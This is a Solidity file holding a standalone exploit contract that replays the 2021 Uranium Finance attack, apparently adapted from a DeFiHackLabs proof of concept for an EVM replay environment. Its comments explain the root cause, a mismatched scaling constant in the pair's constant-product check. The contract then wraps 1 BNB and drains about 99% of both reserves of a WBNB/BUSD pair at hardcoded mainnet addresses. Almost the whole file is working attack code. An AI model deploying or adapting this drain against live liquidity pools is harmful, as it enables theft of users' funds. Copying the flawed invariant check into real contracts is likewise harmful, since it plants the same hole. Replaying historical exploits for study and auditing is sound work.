// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-04-Uranium).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `Exploit is Test`
// contract (testExploit → wrap + two takeFunds), so there is no standalone
// contract to deploy. This file is a faithful, self-contained copy of that
// inline attack (the testExploit body moved into run(); minimal inline
// interfaces — no imports so it compiles anywhere), compiled inside the
// registry forge project. Logic and constants are copied verbatim from
// test/Uranium_exp.sol.
//
// Root cause: UraniumPair.swap() lowered the swap fee from 0.30% to 0.16% by
// scaling the fee-adjusted balances by 10000 (and subtracting amountIn*16),
// but FORGOT to bump the matching constant on the right-hand side of the
// constant-product (K) check, which still uses 1000**2. The LHS is therefore
// scaled 100× more than the RHS, so a swap may shrink the pool's product k to
// as little as 1/100 of its prior value. Depositing 1 token of one side lets
// an attacker withdraw ~99% of the OTHER side's entire reserve in a single
// swap() call. The PoC drains the WBNB/BUSD pair both ways for ~1 token of
// input each.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract UraniumDrain {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    // The WBNB/BUSD UraniumPair. The original test resolves it via
    // UraniumFactory.getPair(...); it is hardcoded here because the dumped
    // factory storage does not match the verified source's slot layout (the
    // pair address is the same — only the lookup path differs).
    IUniswapV2Pair constant PAIR = IUniswapV2Pair(0x9B9baD4c6513E0fF3fB77c739359D59601c7cAfF);

    // Accepts the 1 BNB seed sent in by the PoC setup (so run() can wrap it
    // through the real WBNB.deposit(), which keeps WBNB's internal balances
    // consistent — equivalent to the test's `wbnb.deposit{value: 1 ether}()`).
    receive() external payable {}

    // run() mirrors testExploit(): wrap 1 BNB → WBNB, then drain the WBNB/BUSD
    // pair both directions. Profit (BUSD + WBNB) stays in this contract.
    function run() external {
        // 1: wrap the seed BNB → WBNB (the attack needs ~1 WBNB of input).
        IWBNB(WBNB).deposit{value: 1 ether}();

        // 2: send 1 WBNB in, pull out ~99% of the BUSD reserve (K check passes).
        takeFunds(WBNB, BUSD, 1 ether);

        // 3: send 1 BUSD in (recycled from step 2), pull out ~99% of the WBNB reserve.
        takeFunds(BUSD, WBNB, 1 ether);
    }

    // Verbatim copy of the test's takeFunds(): transfer `amount` of the input
    // token to the pair, then swap for 99% of the pair's balance of the output
    // token. The broken K check lets this succeed despite the ~99% drain.
    function takeFunds(address token0, address token1, uint256 amount) internal {
        address pair = address(PAIR);

        IERC20(token0).transfer(pair, amount);
        uint256 amountOut = (IERC20(token1).balanceOf(pair) * 99) / 100;

        IUniswapV2Pair(pair).swap(
            IUniswapV2Pair(pair).token0() == token1 ? amountOut : 0,
            IUniswapV2Pair(pair).token0() == token1 ? 0 : amountOut,
            address(this),
            new bytes(0)
        );
    }
}
